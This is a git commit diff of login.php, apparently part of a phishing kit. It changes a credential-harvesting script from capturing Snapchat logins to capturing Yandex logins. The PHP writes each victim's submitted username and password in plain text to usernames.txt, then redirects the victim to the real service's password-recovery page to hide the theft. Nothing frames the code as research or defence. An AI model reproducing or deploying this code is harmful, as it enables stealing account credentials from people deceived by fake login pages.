c77a59a987bcac8400480ce66ba6b8a037646845
Manne subhojit <mannesubhojityadav100@gmail.com>
2025-06-26 13:26:44 -0400

    Add files via upload

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
+file_put_contents("usernames.txt", "Yandex Username: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+header('Location: https://passport.yandex.com/restoration');
 exit();
 ?>
